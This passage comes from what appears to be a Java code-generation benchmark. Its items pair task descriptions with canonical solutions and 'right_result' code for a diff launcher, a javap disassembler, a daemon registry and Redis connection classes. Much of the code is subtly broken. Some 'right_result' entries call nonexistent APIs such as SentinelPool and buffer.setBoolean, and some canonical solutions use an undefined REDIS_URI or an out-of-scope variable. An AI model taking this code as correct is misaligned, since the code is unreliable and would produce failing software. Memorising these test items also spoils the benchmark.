    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException {\n    String outPath = diffFile.getAbsolutePath();\n    String cmd = mCustomDiffPath;\n    List<String> cmds = new ArrayList<>();\n    for (String s : cmd.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    for (String s : mCustomDiffPathArgs.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    cmds.add(oldFile.getAbsolutePath());\n    cmds.add(newFile.getAbsolutePath());\n    cmds.add(outPath);\n\n    ProcessBuilder pb = new ProcessBuilder(cmds);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    String line;\n    while ((line = br.readLine()) != null) {\n        Logger.d(line);\n    }\n    int exitCode = process.waitFor();\n    process.destroy();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "import java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.FileOutputStream;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\nimport java.io.PrintWriter;\n\npublic class DiffUtil {\n    public static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException, InterruptedException {\n        ProcessBuilder processBuilder = new ProcessBuilder(mCustomDiffPath, mCustomDiffPathArgs.split(\" \"));\n        processBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n        processBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        processBuilder.redirectInput(ProcessBuilder.Redirect.PIPE);\n\n        Process process = processBuilder.start();\n        try (OutputStream stdin = process.getOutputStream();\n             InputStream stdout = process.getInputStream();\n             InputStream stderr = process.getErrorStream();\n             PrintWriter logWriter = new PrintWriter(System.out)) {\n\n            Thread stdoutThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(stdout))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        logWriter.println(line);\n                    }\n                } catch (IOException e) {\n                    logWriter.println(\"Error reading stdout: \" + e.getMessage());\n                }\n            });\n\n            Thread stderrThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(stderr))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        logWriter.println(\"ERROR: \" + line);\n                    }\n                } catch (IOException e) {\n                    logWriter.println(\"Error reading stderr: \" + e.getMessage());\n                }\n            });\n\n            stdoutThread.start();\n            stderrThread.start();\n\n            stdin.write(oldFile.getAbsolutePath().getBytes());\n            stdin.write(\"\\n\".getBytes());\n            stdin.write(newFile.getAbsolutePath().getBytes());\n            stdin.write(\"\\n\".getBytes());\n            stdin.flush();\n\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                throw new IOException(\"Diff process exited with code \" + exitCode);\n            }\n\n            try (OutputStream diffOutputStream = new FileOutputStream(diffFile)) {\n                InputStream diffInputStream = process.getInputStream();\n                byte[] buffer = new byte[1024];\n                int length;\n                while ((length = diffInputStream.read(buffer)) > 0) {\n                    diffOutputStream.write(buffer, 0, length);\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Create a Java function that disassembles a Java class file using the `javap` command-line tool and returns the disassembled output as a string.\n\nFunction Description: The function `disassembleClassFromJava` takes a Java class file as input, executes the `javap -c` command on it to disassemble the bytecode, and returns the disassembled output as a string. It handles the process execution, stream management, and error handling.\n\nInput: \n- `resourceFile` (String): The path or name of the Java class file to be disassembled.\n\nOutput: \n- (String): The disassembled bytecode output from the `javap` command. If an error occurs, returns an error message string.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.StringWriter;\nimport java.net.URL;\n\npublic String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile)\n                .redirectErrorStream(true);\n\n        final Process process = pb.start();\n        final StringWriter writer = new StringWriter();\n        new Thread(() -> IOUtils.copyStreamNoException(process.getInputStream(), writer)).start();\n\n        final int ignored = process.waitFor();\n        final String processOutput = writer.toString();\n        return processOutput;\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    } catch (IOException e) {\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ClassDisassembler {\n    public static String disassembleClassFromJava(String resourceFile) {\n        StringBuilder output = new StringBuilder();\n        ProcessBuilder processBuilder = new ProcessBuilder(\"javap\", \"-c\", resourceFile);\n        processBuilder.redirectErrorStream(true);\n        try {\n            Process process = processBuilder.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                return \"Error executing javap: Exit code \" + exitCode;\n            }\n        } catch (IOException | InterruptedException e) {\n            return \"Error: \" + e.getMessage();\n        }\n        return output.toString().trim();\n    }\n}"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a thread-safe registry class for managing daemon processes using memory-mapped files for persistent storage. The class should handle concurrent access, automatic file resizing, and data recovery from corrupted states.\n\nClass Description: DaemonRegistry is a thread-safe class that maintains a registry of daemon processes in a memory-mapped file. It provides methods to read, update, and manage daemon information with proper file locking and automatic buffer resizing when needed. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging operations\n- MAX_LENGTH: int - Maximum initial size for the memory-mapped buffer (32KB)\n- LOCK_TIMEOUT_MS: long - Timeout duration for acquiring file locks (20 seconds)\n- locks: Map<Path, Object> - Static concurrent map for maintaining file-level locks\n- registryFile: Path - Path to the registry file\n- lck: Object - Instance-specific lock object\n- channel: FileChannel - File channel for the registry file\n- buffer: MappedByteBuffer - Memory-mapped byte buffer for the file\n- size: long - Current size of the memory-mapped buffer\n- infosMap: Map<String, DaemonInfo> - Map storing daemon information\n\nMethods:\n- DaemonRegistry(Path registryFile) -> void - Constructor that initializes the registry by creating or opening the specified file and setting up the memory-mapped buffer\n- close() -> void - Closes the file channel and releases system resources\n- getAll() -> List<DaemonInfo> - Returns a list of all registered daemon information\n- read() -> void - Reads all daemon information from the memory-mapped file into the internal map\n- doUpdate(Runnable updater) -> void - Performs a read or update operation with file locking, handles buffer resizing and data recovery\n- tryLock() -> FileLock - Attempts to acquire an exclusive lock on the file\n- reset() -> void - Clears the internal map and resets the buffer\n- readString() -> String - Reads a UTF-8 encoded string from the buffer\n- writeString(String str) -> void - Writes a UTF-8 encoded string to the buffer\n- nextPowerOf2(long a, long min) -> long - Helper method to calculate the next power of 2 greater than or equal to input values",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.BufferOverflowException;\nimport java.nio.BufferUnderflowException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DaemonRegistry implements AutoCloseable {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 32768;\n    private static final long LOCK_TIMEOUT_MS = 1000 * 20;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck;\n    private final FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        final Path absPath = registryFile.toAbsolutePath().normalize();\n        this.lck = locks.computeIfAbsent(absPath, p -> new Object());\n        this.registryFile = absPath;\n        try {\n            if (!Files.isRegularFile(absPath)) {\n                if (!Files.isDirectory(absPath.getParent())) {\n                    Files.createDirectories(absPath.getParent());\n                }\n            }\n            channel = FileChannel.open(\n                    absPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = nextPowerOf2(channel.size(), MAX_LENGTH);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            throw new DaemonException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            throw new DaemonException(\"Error closing registry\", e);\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        read();\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        doUpdate(null);\n    }\n\n    private void doUpdate(Runnable updater) {\n        if (!Files.isReadable(registryFile)) {\n            throw new DaemonException(\"Registry became unaccessible\");\n        }\n\n        synchronized (lck) {\n            final long deadline = System.currentTimeMillis() + LOCK_TIMEOUT_MS;\n            while (System.currentTimeMillis() < deadline) {\n                try (FileLock l = tryLock()) {\n                    BufferCaster.cast(buffer).position(0);\n                    infosMap.clear();\n                    int nb = buffer.getInt();\n                    for (int i = 0; i < nb; i++) {\n                        String daemonId = readString();\n                        String javaHome = readString();\n                        String mavenHome = readString();\n                        int pid = buffer.getInt();\n                        String address = readString();\n\n                        byte[] token = new byte[DaemonInfo.TOKEN_SIZE];\n                        buffer.get(token);\n\n                        String locale = readString();\n                        List<String> opts = new ArrayList<>();\n                        int nbOpts = buffer.getInt();\n                        for (int j = 0; j < nbOpts; j++) {\n                            opts.add(readString());\n                        }\n                        DaemonState state = DaemonState.values()[buffer.get()];\n                        long lastIdle = buffer.getLong();\n                        long lastBusy = buffer.getLong();\n                        DaemonInfo di = new DaemonInfo(\n                                daemonId, javaHome, mavenHome, pid, address, token, locale, opts, state, lastIdle,\n                                lastBusy);\n                        infosMap.putIfAbsent(di.getId(), di);\n                    }\n\n                    if (updater != null) {\n                        updater.run();\n                        BufferCaster.cast(buffer).position((int) 0);\n                        buffer.putInt(infosMap.size());\n                        for (DaemonInfo di : infosMap.values()) {\n                            writeString(di.getId());\n                            writeString(di.getJavaHome());\n                            writeString(di.getMvndHome());\n                            buffer.putInt(di.getPid());\n                            writeString(di.getAddress());\n                            buffer.put(di.getToken());\n                            writeString(di.getLocale());\n                            buffer.putInt(di.getOptions().size());\n                            for (String opt : di.getOptions()) {\n                                writeString(opt);\n                            }\n                            buffer.put((byte) di.getState().ordinal());\n                            buffer.putLong(di.getLastIdle());\n                            buffer.putLong(di.getLastBusy());\n                        }\n                    }\n                    return;\n                } catch (BufferOverflowException e) {\n                    size <<= 1;\n                    LOGGER.info(\"Resizing registry to {} kb due to buffer overflow\", (size / 1024));\n                    try {\n                        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                    } catch (IOException ex) {\n                        ex.addSuppressed(e);\n                        throw new DaemonException(\"Could not resize registry \" + registryFile, ex);\n                    }\n                } catch (IOException e) {\n                    throw new DaemonException(\n                            \"Exception while \" + (updater != null ? \"updating \" : \"reading \") + registryFile, e);\n                } catch (IllegalStateException | ArrayIndexOutOfBoundsException | BufferUnderflowException e) {\n                    String absPath = registryFile.toAbsolutePath().normalize().toString();\n                    LOGGER.warn(\n                            \"Invalid daemon registry info, trying to recover from this issue. \"\n                                    + \"If you keep getting this warning, try deleting the `registry.bin` file at [{}]\",\n                            absPath,\n                            e);\n                    this.reset();\n                    return;\n                }\n            }\n            throw new RuntimeException(\"Could not lock \" + registryFile + \" within \" + LOCK_TIMEOUT_MS + \" ms\");\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            return channel.tryLock(0, size, false);\n        } catch (IOException e) {\n            throw new DaemonException(\"Could not lock \" + registryFile, e);\n        }\n    }\n\n    private void reset() {\n        infosMap.clear();\n        BufferCaster.cast(buffer).clear();\n        buffer.putInt(0);\n    }\n\n    protected String readString() {\n        int sz = buffer.getShort();\n        if (sz == -1) {\n            return null;\n        }\n        if (sz < -1 || sz > 1024) {\n            throw new IllegalStateException(\"Bad string size: \" + sz);\n        }\n        byte[] buf = new byte[sz];\n        buffer.get(buf);\n        return new String(buf, StandardCharsets.UTF_8);\n    }\n\n    protected void writeString(String str) {\n        if (str == null) {\n            buffer.putShort((short) -1);\n            return;\n        }\n        byte[] buf = str.getBytes(StandardCharsets.UTF_8);\n        if (buf.length > 1024) {\n            LOGGER.warn(\"Attempting to write string longer than 1024 bytes: '{}'. Please raise an issue.\", str);\n            str = str.substring(0, 1033);\n            while (buf.length > 1024) {\n                str = str.substring(0, str.length() - 12) + \"\u2026\";\n                buf = str.getBytes(StandardCharsets.UTF_8);\n            }\n        }\n        buffer.putShort((short) buf.length);\n        buffer.put(buf);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long b = min;\n        while (b < a) {\n            b = b << 1;\n        }\n        return b;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "import java.io.File;\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Logger;\n\npublic class DaemonRegistry implements AutoCloseable {\n    private static final Logger LOGGER = Logger.getLogger(DaemonRegistry.class.getName());\n    private static final int MAX_LENGTH = 32 * 1024;\n    private static final long LOCK_TIMEOUT_MS = 20000;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n    private final Path registryFile;\n    private final Object lck;\n    private FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap;\n\n    public DaemonRegistry(Path registryFile) throws IOException {\n        this.registryFile = registryFile;\n        this.lck = new Object();\n        this.infosMap = new HashMap<>();\n        createOrOpenFile();\n        read();\n    }\n\n    private void createOrOpenFile() throws IOException {\n        if (!Files.exists(registryFile)) {\n            Files.createFile(registryFile);\n        }\n        try (RandomAccessFile raf = new RandomAccessFile(registryFile.toFile(), \"rw\")) {\n            channel = raf.getChannel();\n            size = Math.max(MAX_LENGTH, Files.size(registryFile));\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        synchronized (lck) {\n            buffer.position(0);\n            int count = 0;\n            while (buffer.hasRemaining()) {\n                int length = buffer.getInt();\n                if (length <= 0) break;\n                String key = readString();\n                int infoSize = buffer.getInt();\n                byte[] infoBytes = new byte[infoSize];\n                buffer.get(infoBytes);\n                DaemonInfo info = DaemonInfo.fromBytes(infoBytes);\n                infosMap.put(key, info);\n                count += length;\n            }\n        }\n    }\n\n    private void doUpdate(Runnable updater) {\n        FileLock lock = null;\n        try {\n            lock = tryLock();\n            if (lock == null) {\n                throw new RuntimeException(\"Failed to acquire lock\");\n            }\n            synchronized (lck) {\n                updater.run();\n            }\n        } catch (Exception e) {\n            LOGGER.severe(\"Error during update: \" + e.getMessage());\n        } finally {\n            if (lock != null) {\n                try {\n                    lock.release();\n                } catch (IOException e) {\n                    LOGGER.severe(\"Error releasing lock: \" + e.getMessage());\n                }\n            }\n        }\n    }\n\n    private FileLock tryLock() throws IOException {\n        synchronized (locks) {\n            Object lockKey = registryFile;\n            if (locks.containsKey(lockKey)) {\n                return null;\n            }\n            locks.put(lockKey, new Object());\n            try {\n                return channel.tryLock(0, Long.MAX_VALUE, true);\n            } catch (IOException e) {\n                locks.remove(lockKey);\n                throw e;\n            }\n        }\n    }\n\n    private void reset() {\n        synchronized (lck) {\n            infosMap.clear();\n            buffer.position(0);\n            buffer.limit(size);\n            buffer.setBoolean(0, false);\n            buffer.position(4);\n        }\n    }\n\n    private String readString() {\n        int length = buffer.getInt();\n        if (length <= 0) return \"\";\n        byte[] bytes = new byte[length];\n        buffer.get(bytes, 0, length);\n        return new String(bytes, java.nio.charset.StandardCharsets.UTF_8);\n    }\n\n    private void writeString(String str) {\n        byte[] bytes = str.getBytes(java.nio.charset.StandardCharsets.UTF_8);\n        int length = bytes.length;\n        buffer.putInt(length);\n        buffer.put(bytes);\n        buffer.position(buffer.position() + length);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        a--;\n        a |= a >>> 1;\n        a |= a >>> 2;\n        a |= a >>> 4;\n        a |= a >>> 8;\n        a |= a >>> 16;\n        a++;\n        return Math.max(a, min);\n    }\n}"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a Redis Sentinel-based connection provider in Java that can discover and connect to the current Redis master node through Sentinel servers.\n\nClass Description: SentineledConnectionProvider is a utility class that manages Redis connections in a Sentinel environment. It discovers the current master node through Sentinel servers and establishes connections to it.\n\nAttributes:\n- masterName: String - The name of the Redis master node as configured in Sentinel\n- masterConfig: JedisClientConfig - Configuration for connecting to the Redis master\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- sentinelConfig: JedisClientConfig - Configuration for connecting to Sentinel servers\n\nMethods:\n- getConnection() -> Connection - Discovers the current master node through Sentinel and returns an established connection to it\n- discoverMaster() -> HostAndPort - Internal method that queries Sentinel servers to find the current master node's address\n- close() -> void - Cleans up any resources (currently a placeholder for future implementation)\n\nInput: \n- Constructor parameters:\n  - masterName: String\n  - masterConfig: JedisClientConfig\n  - sentinels: Set<HostAndPort>\n  - sentinelConfig: JedisClientConfig\n\nOutput:\n- getConnection() returns a connected Connection object to the current Redis master\n- discoverMaster() returns the HostAndPort of the current master node\n- close() has no return value",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.HashSet;\n\npublic class SentineledConnectionProvider {\n\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig,\n                                      Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        try {\n            HostAndPort master = discoverMaster();\n            Connection connection = new Connection(master, masterConfig);\n            connection.connect();\n            return connection;\n        } catch (JedisException e) {\n            throw new JedisConnectionException(\"Failed to get connection from sentinel\", e);\n        }\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel, sentinelConfig)) {\n                String masterHost = jedis.sentinelGetMasterAddrByName(masterName).get(0);\n                int masterPort = Integer.parseInt(jedis.sentinelGetMasterAddrByName(masterName).get(1));\n                return new HostAndPort(masterHost, masterPort);\n            } catch (Exception e) {\n                continue;\n            }\n        }\n        throw new JedisException(\"Could not discover master from sentinels\");\n    }\n\n    public void close() {\n        // Cleanup resources if needed\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.SentinelPool;\nimport redis.clients.jedis.exceptions.JedisException;\n\nimport java.util.HashSet;\nimport java.util.Set;\n\npublic class SentineledConnectionProvider {\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n    private SentinelPool sentinelPool;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n        this.sentinelPool = new SentinelPool(sentinelConfig, sentinels, masterName);\n    }\n\n    public Connection getConnection() {\n        HostAndPort masterAddress = discoverMaster();\n        if (masterAddress == null) {\n            throw new JedisException(\"No master found through Sentinel\");\n        }\n        Jedis jedis = new Jedis(masterAddress.getHost(), masterAddress.getPort(), masterConfig);\n        return new Connection(jedis);\n    }\n\n    private HostAndPort discoverMaster() {\n        try (Jedis sentinelClient = new Jedis(sentinelConfig, sentinels.iterator().next().getHost(), sentinels.iterator().next().getPort())) {\n            String masterAddr = sentinelClient.sentinelGetMasterAddrByName(masterName);\n            String[] parts = masterAddr.split(\",\");\n            return new HostAndPort(parts[0], Integer.parseInt(parts[1]));\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void close() {\n        if (sentinelPool != null) {\n            sentinelPool.close();\n        }\n    }\n\n    static class Connection {\n        private final Jedis jedis;\n\n        public Connection(Jedis jedis) {\n            this.jedis = jedis;\n        }\n\n        public Jedis getJedis() {\n            return jedis;\n        }\n    }\n}"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with token-based authentication for multiple users.\n\nClass Description: The RedisConnectionManager class provides functionality to establish and manage Redis connections (both standalone and cluster) using token-based authentication. It supports multiple authentication credentials and configures connection options like timeouts and reauthentication behavior.\n\nAttributes:\n- redisClient: RedisClient - The client for standalone Redis connections\n- redisClusterClient: RedisClusterClient - The client for Redis cluster connections\n- credentialsUser1: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 1\n- credentialsUser2: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 2\n\nMethods:\n- RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) -> void - Constructor that initializes the connection manager with Redis URI, authentication authority, scopes, and credentials for two users\n- createStandaloneConnection() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user1 credentials\n- createStandaloneConnectionWithUser2() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user2 credentials\n- createClusterConnection() -> StatefulRedisClusterConnection<String, String> - Creates and returns a Redis cluster connection\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import io.lettuce.authx.TokenBasedRedisCredentialsProvider;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.cluster.api.sync.NodeSelection;\nimport io.lettuce.core.cluster.api.sync.RedisAdvancedClusterCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, \n                                String user1ClientId, String user1Secret, \n                                String user2ClientId, String user2Secret) {\n        IdentityProviderConfig config1;\n        try (EntraIDTokenAuthConfigBuilder builder = EntraIDTokenAuthConfigBuilder.builder()) {\n            config1 = builder.authority(authority).clientId(user1ClientId).secret(user1Secret).scopes(scopes)\n                    .tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        }\n\n        TokenAuthConfig tokenAuthConfigUser1 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config1).build();\n        credentialsUser1 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser1);\n\n        IdentityProviderConfig config2 = EntraIDTokenAuthConfigBuilder.builder().authority(authority).clientId(user2ClientId)\n                .secret(user2Secret).scopes(scopes).tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        TokenAuthConfig tokenAuthConfigUser2 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config2).build();\n        credentialsUser2 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser2);\n\n        RedisURI redisURI1 = RedisURI.create(redisUri);\n        redisURI1.setCredentialsProvider(credentialsUser1);\n\n        RedisURI redisURI2 = RedisURI.create(redisUri);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClient = RedisClient.create(redisURI1);\n        redisClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect(StringCodec.UTF8);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        RedisURI redisURI2 = RedisURI.create(REDIS_URI);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n        return redisClient.connect(StringCodec.UTF8, redisURI2);\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        ClusterClientOptions clusterClientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClusterClient = RedisClusterClient.create(redisURI1);\n        redisClusterClient.setOptions(clusterClientOptions);\n        return redisClusterClient.connect(StringCodec.UTF8);\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n        if (credentialsUser1 != null) {\n            credentialsUser1.close();\n        }\n        if (credentialsUser2 != null) {\n            credentialsUser2.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisClusterClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.StatefulRedisClusterConnection;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) {\n        // Initialize credentials providers\n        credentialsUser1 = new TokenBasedRedisCredentialsProvider(authority, scopes, user1ClientId, user1Secret);\n        credentialsUser2 = new TokenBasedRedisCredentialsProvider(authority, scopes, user2ClientId, user2Secret);\n\n        // Initialize Redis clients\n        redisClient = RedisClient.create(redisUri);\n        redisClusterClient = RedisClusterClient.create(redisUri);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect().with(credentialsUser1.getToken());\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        return redisClient.connect().with(credentialsUser2.getToken());\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return redisClusterClient.connect().with(credentialsUser1.getToken());\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 322,
